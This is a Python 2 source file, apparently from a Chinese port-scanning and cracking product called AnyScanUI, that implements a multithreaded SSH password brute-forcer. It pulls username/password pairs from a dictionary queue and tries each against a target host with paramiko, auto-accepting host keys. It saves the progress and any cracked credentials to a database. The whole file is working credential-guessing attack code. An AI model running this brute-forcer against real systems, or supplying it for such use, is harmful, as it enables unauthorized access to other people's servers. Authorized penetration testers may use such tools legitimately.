# -*- coding: utf-8 -*-

"""
 * Copyright(C) Anyuntec 2017.
 *
 * ssh攻击
 *
 * @author margin 2017/02/17.
 *
 * @version V1.00.
 *
 * 更新履历： V1.00 2017/02/17 margin 创建.
 *
 """
from AttackBase import AttackBase
from AttackObject import AttackObject
import threading,traceback,Queue,paramiko
from AnyScanUI.models import PortCrack,PortCrackChild
from AnyScanUI.util import currenttime
import datetime,json,time,sys

class SSHAttack(AttackBase):
    # 数据锁，当为True时不可更新数据库内容{"ip+port":True}
    __locker = {}
    __attackObject = None
    def __init__(self,attackObject):
        super(SSHAttack, self).__init__(attackObject)
        self.__attackObject = attackObject
        pass


    def attack(self,obj):
        """
        SSH爆破类
        """
        result = {"status":True,"msg":"正在破解"}
        try:
            self.__locker = obj["locker"]
            # 获取线程数
            threads = 5
            ip_ = obj['ip']
            port_ = obj['port']
            # 任务id
            id_ = obj["id"]
            # 爆破功能函数
            callback = obj["callback"]
            # 生成字典对应的queue
            attack_queue_result = self.attack_queue(id_)
            if attack_queue_result["status"]:
                # 将生成的queue加入到攻击属性的attack_queue_dict中
                self.__attackObject.attack_queue_dict[ip_+port_] = attack_queue_result["data"]
                # 保留该queue的原始长度用于计算爆破进度
                self.__attackObject.attack_queue_size_dict[ip_+port_] = attack_queue_result["old_queue_size"]
                # 获取线程数
                threads = attack_queue_result["threads"]
                print "当前单个子任务线程数%s" % threads
            else:
                return attack_queue_result
            while True:
                print "当前线程数[%s]" % self.__attackObject.threads_queue.qsize()
                if self.__attackObject.threads_queue.qsize() >= threads:
                    # 使用攻击对象attactObject的线程数来控制是否要启动新的线程
                    for index in range(0,threads):
                        self.__attackObject.threads_queue.get()
                        # 判断字典队列中是否还有值，如果没值了，就不用启动线程了
                        if self.__attackObject.attack_queue_dict[ip_+port_].qsize() > 0:
                            attacker = Attacker(self.__attackObject,{"ip":ip_,"port":port_,"id":id_,"locker":{},"callback":callback})
                            attacker.setDaemon(True)
                            attacker.start()
                    break

                time.sleep(1)

        except Exception:
            print traceback.format_exc()
            result = {"status":False,"msg":traceback.format_exc()}
            return result

class Attacker(threading.Thread):
    """
    SSH爆破类
    """
    __attackObject = None
    param = {}
    __locker = {}
    def __init__(self,attackObject,param):
        #注意：一定要显式的调用父类的初始化函数。
        super(Attacker, self).__init__()
        self.__attackObject = attackObject
        self.param = param
        self.__locker = param["locker"]

    def run(self):
        reload(sys)
        sys.setdefaultencoding('utf8')
        ip_ = str(self.param["ip"])
        port_ = str(self.param["port"])
        # 当前任务id
        id_ = str(self.param["id"])
        # 当前任务爆破功能函数
        callback = self.param["callback"]
        # 获取单个爆破线程
        thread = self.__attackObject.getThreads()
        portcrackchild = None
        while True:
            #print "正在破解"
            if self.__locker.get(ip_+port_) is True:
                # 清空队列
                self.__attackObject.getAttack_queue_dict(ip_+port_).queue.clear()
                print "任务被停止1 %s" % ip_
                # 当状态为lock时，说明某一个线程爆破成功了，直接退出即可。
                break
            try:
                # 获取当前爆破任务的状态，如果已经是lock状态，那么任务暂停。
                portcrackchild = PortCrackChild.objects.get(id=id_)
            # 如果任务不存在了，直接结束任务
            except:
                # 将当前的字典queue对象保存到数据库，在下次启动是读取该queue进行爆破
                crack_list = list(self.__attackObject.getAttack_queue_dict(ip_+port_).queue)
                print "任务被停止2 %s" % ip_
                break
            if portcrackchild.status == "pause":
                # 将当前的字典queue对象保存到数据库，在下次启动是读取该queue进行爆破
                crack_list = list(self.__attackObject.getAttack_queue_dict(ip_+port_).queue)
                # 保存当前任务的状态，主要是剩余的字典
                if self.__attackObject.getAttack_queue_dict(ip_+port_).qsize() > 0:
                    __crack_list = json.dumps(crack_list)
                    #print __crack_list
                    PortCrackChild.objects.filter(id=id_).update(attack_queue_list=__crack_list,end_time=currenttime(),threads=thread)
                    print "任务被暂停3 %s" % ip_

                # 清空队列
                self.__attackObject.getAttack_queue_dict(ip_+port_).queue.clear()
                break
            if self.__attackObject.getAttack_queue_dict(ip_+port_).empty() is False:
                # 获取当前爆破字典queue
                up_ = self.__attackObject.getAttack_queue_dict(ip_+port_).get()
                username_ = str(up_[0])
                password_ = str(up_[1])
                # 计算进度
                c_size = self.__attackObject.getAttack_queue_dict(ip_+port_).qsize()
                o_size = self.__attackObject.getAttack_queue_size_dict(ip_+port_)
                progress = 1-float(format(float(c_size)/float(o_size),'.4f'))
                progress = '%.2f' % (progress * 100)
                param = (ip_,port_,"SSH",progress+"%",username_,password_)
                #print "正在爆破 %s:%s" % (ip_,port_)
                # 读取log日志
                log = self.__attackObject.getLog(param)
                # 更新日志数据
                PortCrackChild.objects.filter(id=id_).update(end_time=currenttime(),old_queue_size=o_size,type="SSH",progress=str(progress),log=str(log),threads=thread)
                # 如果连接成功，说明用户名密码正确
                if callback(ip_,username_,password_):
                    self.__locker[ip_+port_] = True
                    PortCrackChild.objects.filter(id=id_).update(end_time=currenttime(),status="success",username=username_,password=password_,progress=str("100"),log=self.__attackObject.getSuccessLog((ip_,port_,"SSH",username_,password_)))
                    print "破解成功，填充线程队列 %s" % self.__attackObject.threads_queue.qsize()
                    for i in range(0,thread):
                        self.__attackObject.threads_queue.put("")
                    break
            else:
                print "任务被停止4 %s" % ip_
                # 如果字典队列空了，那么直接关掉跳出循环，更新为爆破失败
                if self.__locker.get(ip_+port_) != True:
                    self.__locker[ip_+port_] = True
                    PortCrackChild.objects.filter(id=id_).update(end_time=currenttime(),status="finish",progress=str("100"),log=self.__attackObject.getFinishLog((ip_,port_)))
                break

    def connect(self,host,username,password):
        """
        ssh连接
        :param host:
        :param username:
        :param password:
        :return:
        """
        ssh=paramiko.SSHClient()
        try:
            #print username+':'+password+'开始时间======》' + str(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'))
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host,username=username,password=password,timeout=0.5)
            return True
        except:
            #print traceback.format_exc()
            # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
            return False
        finally:
            ssh.close()